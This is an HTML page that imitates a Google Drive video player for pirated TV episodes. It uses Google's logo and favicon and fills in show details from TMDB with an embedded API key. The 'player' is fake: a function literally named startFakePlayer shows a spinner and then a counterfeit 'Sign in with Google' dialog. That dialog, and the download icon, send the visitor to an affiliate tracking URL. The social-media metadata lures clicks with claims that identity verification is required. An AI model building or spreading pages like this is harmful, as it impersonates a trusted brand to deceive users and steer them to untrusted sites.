<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    
    <title id="page-title">Google Drive: Private Video Access</title>
    
    <meta property="og:site_name" content="FILE-TV.RF.GD">
    <meta property="og:title" id="og-title" content="[DIRECT ACCESS] Loading Content...">
    <meta property="og:description" id="og-description" content="Watch Full HD streaming. Identity verification required for secure access.">
    
    <meta property="og:image" id="og-image" content="">
    <meta property="og:image:width" content="1280">
    <meta property="og:image:height" content="720">
    <meta property="og:type" content="video.other">

    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" id="twitter-title" content="Access Requested: Secure Video Content">
    <meta name="twitter:image" id="twitter-image" content="">

    <link rel="icon" type="image/png" href="https://www.gstatic.com/images/branding/product/1x/drive_2020q4_32dp.png">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">

    <style>
        :root { --drive-bg: #0d0d0d; --header-bg: #1a1b1c; --google-blue: #8ab4f8; --btn-blue: #1a73e8; --gray-text: #9aa0a6; --folder-bg: #1e1f21; --border: #3c4043; --text-main: #e8eaed; --card-shadow: rgba(0,0,0,0.5); }
        [data-theme="light"] { --drive-bg: #f8f9fa; --header-bg: #ffffff; --google-blue: #1a73e8; --btn-blue: #1a73e8; --gray-text: #5f6368; --folder-bg: #ffffff; --border: #dadce0; --text-main: #3c4043; --card-shadow: rgba(0,0,0,0.1); }
        * { margin:0; padding:0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
        body { background: var(--drive-bg); color: var(--text-main); font-family: 'Roboto', sans-serif; overflow-y: auto; min-height: 100vh; }
        .g-header { position: fixed; top: 0; width: 100%; height: 64px; background: var(--header-bg); display: flex; align-items: center; padding: 0 16px; z-index: 2000; border-bottom: 1px solid var(--border); }
        .h-left { display: flex; align-items: center; gap: 12px; flex: 1; min-width: 0; }
        .file-name { font-size: 17px; font-weight: 400; color: var(--text-main); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
        .h-right { display: flex; align-items: center; gap: 8px; }
        .h-icon { width: 40px; height: 40px; display: flex; align-items: center; justify-content: center; color: var(--gray-text); font-size: 18px; cursor: pointer; border-radius: 50%; }
        .main-container { padding-top: 85px; display: flex; flex-direction: column; align-items: center; }
        .player-wrapper { width: 94%; max-width: 900px; aspect-ratio: 16/9; background: #000; border-radius: 12px; position: relative; overflow: hidden; cursor: pointer; box-shadow: 0 10px 30px var(--card-shadow); margin-bottom: 25px; }
        #backdrop { position: absolute; inset: 0; background-size: cover; background-position: center; opacity: 0.6; }
        .overlay { position: absolute; inset: 0; display: flex; align-items: center; justify-content: center; z-index: 10; }
        .play-btn { width: 70px; height: 70px; background: rgba(255,255,255,0.9); border-radius: 50%; display: flex; align-items: center; justify-content: center; }
        .play-btn i { color: #202124; font-size: 26px; margin-left: 5px; }
        .spinner { display: none; width: 55px; height: 55px; border: 4px solid rgba(255,255,255,0.3); border-top-color: #fff; border-radius: 50%; animation: spin 1s linear infinite; }
        @keyframes spin { to { transform: rotate(360deg); } }
        .player-controls { position: absolute; bottom: 0; width: 100%; height: 48px; background: linear-gradient(transparent, rgba(0,0,0,0.85)); display: flex; align-items: center; padding: 0 15px; gap: 15px; z-index: 15; }
        .progress-bar { position: absolute; top: 0; left: 0; right: 0; height: 3px; background: rgba(255,255,255,0.3); }
        .time-display { font-size: 13px; color: #fff; flex: 1; }
        .list-section { width: 92%; max-width: 900px; }
        .section-header { font-size: 11px; color: var(--gray-text); margin: 20px 0 8px; font-weight: 500; text-transform: uppercase; letter-spacing: 1px; }
        .folder-box { background: var(--folder-bg); padding: 15px 18px; border-radius: 10px; border: 1px solid var(--border); display: flex; align-items: center; justify-content: space-between; cursor: pointer; margin-bottom: 12px; }
        .folder-content { display: flex; align-items: center; gap: 15px; }
        .dropdown-list { display: none; background: var(--folder-bg); border: 1px solid var(--border); border-radius: 10px; margin-top: -8px; margin-bottom: 20px; overflow-y: auto; max-height: 280px; }
        .item-opt { display: flex; align-items: center; gap: 12px; padding: 14px 18px; text-decoration: none; color: var(--text-main); border-bottom: 1px solid var(--border); font-size: 14px; }
        .item-opt.active { color: var(--google-blue); font-weight: 500; background: rgba(26, 115, 232, 0.1); }
        .modal-overlay { display: none; position: fixed; inset: 0; background: rgba(0, 0, 0, 0.75); z-index: 9999; align-items: center; justify-content: center; backdrop-filter: blur(5px); }
        .google-card { background: #fff; width: 92%; max-width: 420px; padding: 45px 35px; border-radius: 8px; text-align: center; color: #202124; }
    </style>
</head>
<body data-theme="dark">

<nav class="g-header">
    <div class="h-left">
        <div class="h-icon" onclick="history.back()"><i class="fas fa-arrow-left"></i></div>
        <div class="file-name" id="h-title">Loading...</div>
    </div>
    <div class="h-right">
        <div class="h-icon" onclick="showLogin()"><i class="fas fa-download"></i></div>
    </div>
</nav>

<div class="main-container">
    <div class="player-wrapper" onclick="startFakePlayer()">
        <div id="backdrop"></div>
        <div class="overlay">
            <div class="play-btn" id="play-ui"><i class="fas fa-play"></i></div>
            <div class="spinner" id="spinner-ui"></div>
        </div>
        <div class="player-controls">
            <div class="progress-bar"></div>
            <div class="time-display"><i class="fas fa-play" style="font-size: 12px; margin-right: 15px;"></i> 0:00 / <span id="runtime-display">--:--</span></div>
        </div>
    </div>

    <div class="list-section">
        <div class="section-header">Select Season</div>
        <div class="folder-box" onclick="toggleDD('s-dropdown')">
            <div class="folder-content">
                <i class="fas fa-folder" style="color:#fabb05"></i>
                <span id="selected-season-text">Season...</span>
            </div>
            <i class="fas fa-chevron-down" style="font-size:12px; color:var(--gray-text)"></i>
        </div>
        <div class="dropdown-list" id="s-dropdown"></div>

        <div class="section-header">Select Episode</div>
        <div class="dropdown-list" id="e-dropdown" style="display:block; position:static; border:none;"></div>
    </div>
</div>

<div class="modal-overlay" id="loginModal">
    <div class="google-card">
        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="75" style="margin-bottom:15px">
        <h1 style="font-size:24px; font-weight:400; margin-bottom:8px">Sign in</h1>
        <p style="font-size:16px; margin-bottom:30px; color: #5f6368;">to continue to Google Drive</p>
        <div style="display:flex; align-items:center; padding:12px; border:1px solid #dadce0; border-radius:4px; text-align:left; cursor:pointer" onclick="goToLink()">
            <i class="fas fa-user-circle" style="font-size:22px; color:#5f6368; margin-right:12px"></i>
            <span style="font-size:14px; font-weight:500; color:#3c4043; flex:1">Sign in with Google</span>
        </div>
    </div>
</div>

<script>
    const API_KEY = "22be462e6d3de1dbab03d1ca50847b5a";

    // --- MENGAMBIL DATA DARI PATH URL (/tv/79744/1/1) ---
    const pathParts = window.location.pathname.split('/').filter(p => p);
    let tvID = pathParts[1] || '79744'; 
    let sNum = parseInt(pathParts[2]) || 1;
    let eNum = parseInt(pathParts[3]) || 1;

    async function loadTV() {
        try {
            const r = await fetch(`https://api.themoviedb.org/3/tv/${tvID}?api_key=${API_KEY}`);
            const data = await r.json();
            
            const rs = await fetch(`https://api.themoviedb.org/3/tv/${tvID}/season/${sNum}?api_key=${API_KEY}`);
            const sData = await rs.json();
            const activeEp = sData.episodes.find(ep => ep.episode_number == eNum) || sData.episodes[0];
            
            // LOGIKA GAMBAR: Gunakan poster asli film untuk OG:IMAGE dan BACKDROP
            const backdropURL = `https://image.tmdb.org/t/p/w1280${activeEp.still_path || data.backdrop_path}`;
            
            // GANTI GAMBAR DI META TAGS SECARA DINAMIS
            document.getElementById('og-image').setAttribute('content', backdropURL);
            document.getElementById('twitter-image').setAttribute('content', backdropURL);
            document.getElementById('backdrop').style.backgroundImage = `url(${backdropURL})`;

            // Update UI Teks
            const cleanTitle = data.name.replace(/[:\s]+/g, '_');
            document.getElementById('h-title').innerText = `${cleanTitle}_S${sNum}_E${eNum}.mp4`;
            document.getElementById('selected-season-text').innerText = `Season ${sNum}`;
            document.getElementById('runtime-display').innerText = (activeEp.runtime || 45) + ":00";
            document.getElementById('page-title').innerText = `Google Drive: ${data.name} S${sNum} E${eNum}`;

            // Render Season (Link format baru)
            const sDD = document.getElementById('s-dropdown');
            sDD.innerHTML = "";
            for(let i=1; i<=data.number_of_seasons; i++) {
                sDD.innerHTML += `<a href="/tv/${tvID}/${i}/1" class="item-opt ${i==sNum?'active':''}">Season ${i}</a>`;
            }

            // Render Episodes (Link format baru)
            const eDD = document.getElementById('e-dropdown');
            eDD.innerHTML = sData.episodes.map(ep => `
                <a href="/tv/${tvID}/${sNum}/${ep.episode_number}" class="item-opt ${ep.episode_number == eNum ? 'active' : ''}">
                    <i class="fas fa-play-circle" style="opacity:0.6"></i>
                    E${ep.episode_number} - ${ep.name}
                </a>`).join('');

        } catch (e) { console.error(e); }
    }

    function toggleDD(id) {
        const dd = document.getElementById(id);
        dd.style.display = dd.style.display === 'block' ? 'none' : 'block';
    }

    function startFakePlayer() {
        document.getElementById('play-ui').style.display = 'none';
        document.getElementById('spinner-ui').style.display = 'block';
        setTimeout(showLogin, 1500);
    }

    function showLogin() { 
        document.getElementById('loginModal').style.display = 'flex'; 
    }
    
    function goToLink() { window.location.href = "https://playfloowz.com/c?a=275&o=19&sub2=tv_clean"; }

    loadTV();
</script>
</body>
</html>
